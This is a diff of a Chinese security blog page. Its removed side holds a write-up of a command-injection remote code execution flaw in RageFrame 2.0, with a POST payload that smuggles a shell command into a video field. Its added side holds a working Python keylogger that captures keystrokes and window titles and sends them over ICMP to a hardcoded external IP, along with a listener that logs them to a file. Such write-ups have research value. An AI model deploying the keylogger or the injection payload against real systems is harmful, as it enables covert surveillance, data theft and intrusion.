@@ -16,25 +16,21 @@
   <meta name="author" content="FFreestanding">
   <meta name="keywords" content="">
   
-    <meta name="description" content="RageFrame 2.0(commit e02ba318639bdb99492d15f26e5cc012f1ed5a24) has a Remote Code Execute Vulnerability Overview of Vulnerabilitiesaddons\RfExample\merchant\controllers\VideoController.php 123456789101">
+    <meta name="description" content="这个PyHook3还是非常难装的，用了作者提供的虚拟机环境 12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- coding: utf-8 -*-#被监听端import PyHook3import osfrom scapy.all import *message&#x3D;&amp;#x27;root&amp;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="TheCommit">
+<meta property="og:title" content="Scapy6">
 <meta property="og:url" content="https://ffreestanding.github.io/posts/3667977.html">
 <meta property="og:site_name" content="FFreestanding">
-<meta property="og:description" content="RageFrame 2.0(commit e02ba318639bdb99492d15f26e5cc012f1ed5a24) has a Remote Code Execute Vulnerability Overview of Vulnerabilitiesaddons\RfExample\merchant\controllers\VideoController.php 123456789101">
+<meta property="og:description" content="这个PyHook3还是非常难装的，用了作者提供的虚拟机环境 12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- coding: utf-8 -*-#被监听端import PyHook3import osfrom scapy.all import *message&#x3D;&amp;#x27;root&amp;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://ffreestanding.github.io/images/TheCommit/image-20230209184509795.png">
-<meta property="og:image" content="https://ffreestanding.github.io/images/TheCommit/image-20230209185534572.png">
-<meta property="og:image" content="https://ffreestanding.github.io/images/TheCommit/image-20230209185619622.png">
 <meta property="article:published_time" content="2022-06-07T01:38:18.000Z">
-<meta property="article:modified_time" content="2023-02-09T13:39:45.899Z">
+<meta property="article:modified_time" content="2022-06-20T08:02:12.000Z">
 <meta property="article:author" content="FFreestanding">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://ffreestanding.github.io/images/TheCommit/image-20230209184509795.png">
   
   
   
-  <title>TheCommit - FFreestanding</title>
+  <title>Scapy6 - FFreestanding</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +193,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle">TheCommit</span>
+            <span id="subtitle">Scapy6</span>
           
         </div>
 
@@ -220,7 +216,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.2k 字
+          1.5k 字
         
       </span>
     
@@ -231,7 +227,7 @@
         
         
         
-          19 分钟
+          13 分钟
         
       </span>
     
@@ -269,32 +265,15 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">TheCommit</h1>
+            <h1 style="display: none">Scapy6</h1>
             
             <div class="markdown-body">
               
-              <p>RageFrame 2.0(commit e02ba318639bdb99492d15f26e5cc012f1ed5a24) has a Remote Code Execute Vulnerability</p>
-<h2 id="Overview-of-Vulnerabilities"><a href="#Overview-of-Vulnerabilities" class="headerlink" title="Overview of Vulnerabilities"></a>Overview of Vulnerabilities</h2><p>addons\RfExample\merchant\controllers\VideoController.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionCutImage</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$model</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CutImageForm</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">load</span>(<span class="hljs-title class_">Yii</span>::<span class="hljs-variable">$app</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>())) &#123;<br>            <span class="hljs-variable">$filePath</span> = <span class="hljs-title class_">StringHelper</span>::<span class="hljs-title function_ invoke__">getLocalFilePath</span>(<span class="hljs-variable">$model</span>-&gt;video);<br>            <span class="hljs-variable">$img</span> = <span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachment/&quot;</span>) . <span class="hljs-string">&quot;test1.jpg&quot;</span>;<br><br>            <span class="hljs-comment">// ffmpeg获取视频帧 -i 后面是输出 -y 是质量 -f 是输出格式  -t 时间</span><br>            <span class="hljs-comment">// shell_exec(&quot;ffmpeg -i &#123;$filePath&#125; -y -f image2 -t 0.05 -s 352*240 &#123;$img&#125;&quot;);</span><br><br>            <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ffmpeg -ss 00:00:01  -i <span class="hljs-subst">&#123;$filePath&#125;</span> -f mjpeg -r 1 -vframes 1 -an <span class="hljs-subst">&#123;$img&#125;</span>&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-variable">$this</span>-&gt;action-&gt;id, [<br>            <span class="hljs-string">&#x27;model&#x27;</span> =&gt; <span class="hljs-variable">$model</span>,<br>        ]);<br>    &#125;<br></code></pre></td></tr></table></figure>
+              <p>这个PyHook3还是非常难装的，用了作者提供的虚拟机环境</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#被监听端</span><br><span class="hljs-keyword">import</span> PyHook3<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>message=<span class="hljs-string">&#x27;root&#x27;</span><span class="hljs-comment">#以data中是否有root判断是不是被控端发来的，可能有别人正常地ping服务器</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">OnMouseEvent</span>(<span class="hljs-params">event</span>):<br>    <span class="hljs-keyword">global</span> message<br>    message += <span class="hljs-string">&#x27;\n&#x27;</span>+event.WindowName+<span class="hljs-string">&#x27;\n&#x27;</span><span class="hljs-comment">#窗口名称</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(message)&gt;<span class="hljs-number">5</span>):<span class="hljs-comment">#message储存了一些后再发，这个随便，可以去掉</span><br>        pinger = IP(dst=<span class="hljs-string">&quot;150.158.18.137&quot;</span>) / ICMP(<span class="hljs-built_in">id</span>=<span class="hljs-number">0x0001</span>, seq=<span class="hljs-number">0x1</span>) / message<br>        send(pinger)<br>        message=<span class="hljs-string">&#x27;root&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">OnKeyboardEvent</span>(<span class="hljs-params">event</span>):<br>    <span class="hljs-keyword">global</span> message<br>    <span class="hljs-keyword">if</span>((event.Ascii&lt;<span class="hljs-number">32</span>)<span class="hljs-keyword">or</span>(event.Ascii&gt;<span class="hljs-number">126</span>)):<br>        message+=<span class="hljs-string">&#x27; &#x27;</span><br><br>    message += event.Key<span class="hljs-comment">#按键名称</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(message)&gt;<span class="hljs-number">5</span>):<br>        pinger = IP(dst=<span class="hljs-string">&quot;150.158.18.137&quot;</span>) / ICMP(<span class="hljs-built_in">id</span>=<span class="hljs-number">0x0001</span>, seq=<span class="hljs-number">0x1</span>) / message<br>        send(pinger)<br>        message=<span class="hljs-string">&#x27;root&#x27;</span><br><br>    <span class="hljs-keyword">if</span>((event.Ascii&lt;<span class="hljs-number">32</span>)<span class="hljs-keyword">or</span>(event.Ascii&gt;<span class="hljs-number">126</span>)):<br>        message+=<span class="hljs-string">&#x27; &#x27;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br>hm = PyHook3.HookManager()<br>hm.MouseAllButtonsDown = OnMouseEvent<br>hm.KeyDown = OnKeyboardEvent<br>hm.HookMouse()<br>hm.HookKeyboard()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">import</span> pythoncom<br>    pythoncom.PumpMessages()<br></code></pre></td></tr></table></figure>
 
-<p>CutImageForm is derived from Model, CutImageForm-&gt;load is equivalent to Model-&gt;load, $model-&gt;load(Yii::$app-&gt;request-&gt;post()) gets the post parameter, $model-&gt;video takes the video parameter of POST , pass in the following function</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLocalFilePath</span>(<span class="hljs-params"><span class="hljs-variable">$url</span>, <span class="hljs-variable">$type</span> = <span class="hljs-string">&#x27;images&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">RegularHelper</span>::<span class="hljs-title function_ invoke__">verify</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">RegularHelper</span>::<span class="hljs-title function_ invoke__">verify</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachurl&quot;</span>))) &#123;<br>                <span class="hljs-variable">$hostInfo</span> = <span class="hljs-title class_">Yii</span>::<span class="hljs-variable">$app</span>-&gt;request-&gt;hostInfo . <span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachurl&quot;</span>);<br>                <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$hostInfo</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachurl&quot;</span>), <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$url</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachurl&quot;</span>), <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Yii</span>::<span class="hljs-title function_ invoke__">getAlias</span>(<span class="hljs-string">&quot;@attachment&quot;</span>) . <span class="hljs-variable">$url</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
-
-<p><code>RegularHelper::verify(&#39;url&#39;, $url)</code>equals<code>preg_match(&#39;/(http:\/\/)|(https:\/\/)/i&#39;, $url)</code></p>
-<p>video&#x3D;<code>http://aaa;cmd;</code>can satisfy<code>RegularHelper::verify(&#39;url&#39;, $url)</code></p>
-<p>so we use<code>$filePath=&#39;xxx&#39;.http://aaa;cmd;</code>to RCE</p>
-<h2 id="Construction-of-environment"><a href="#Construction-of-environment" class="headerlink" title="Construction of environment"></a>Construction of environment</h2><p>follow the document to install</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/jianyan74/rageframe2/blob/master/docs/guide-zh-CN/start-installation.md">installation</a></p>
-<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>Install a addon</p>
-<p><img src="/../images/TheCommit/image-20230209184509795.png" srcset="/img/loading.gif" lazyload alt="image-20230209184509795"></p>
-<p>Then visit <a target="_blank" rel="noopener" href="http://localhost/backend/rf-example/video/cut-image">http://localhost/backend/rf-example/video/cut-image</a>, try to upload a mp3 and save</p>
-<p><img src="/../images/TheCommit/image-20230209185534572.png" srcset="/img/loading.gif" lazyload alt="image-20230209185534572"></p>
-<p>Finally we can catch a package</p>
-<p><img src="/../images/TheCommit/image-20230209185619622.png" srcset="/img/loading.gif" lazyload alt="image-20230209185619622"></p>
-<p>Send the package to <strong>Repeater</strong></p>
-<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>change CutImageForm[video] like below</p>
-<p><code>CutImageForm[video]=http%3A%2F%2Flocalhost%2Fattachment%2Fvideos%2F2023%2F02%2F09%2Fmeeting_04.mp4+||open+-a+Calculator+||</code></p>
-<p>Calculator will be open</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#监听端</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> ICMP<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        rx = sniff(<span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;icmp&quot;</span>, count=<span class="hljs-number">1</span>)<br>        v = rx[<span class="hljs-number">0</span>].load.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;root&quot;</span> <span class="hljs-keyword">in</span> v:<span class="hljs-comment">#检查data里面有没有root</span><br>            <span class="hljs-built_in">print</span>(v[<span class="hljs-number">4</span>:],end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            file_handle=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,mode=<span class="hljs-string">&#x27;a&#x27;</span>)<br>            file_handle.writelines(v[<span class="hljs-number">4</span>:])<span class="hljs-comment">#去掉开头的root，写入文件</span><br>            file_handle.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p>测试结果是，在内网通信正常，当发给外网的服务器（接收端）丢包比较多。然后两种情况下监听端程序容易突然中断。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/a675115471/article/details/104098505">这个大佬</a>实现效果比较好，丢包率低。以后有时间具体研究一下。</p>
 
               
             </div>
@@ -334,9 +313,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/3667977.html" title="Scapy6">
+                      <a href="/posts/e4dc8931.html" title="CTFWiki_PWN_LinuxPlatform_UserMode_Exploitation_StackOverflow_x86">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Scapy6</span>
+                        <span class="hidden-mobile">CTFWiki_PWN_LinuxPlatform_UserMode_Exploitation_StackOverflow_x86</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
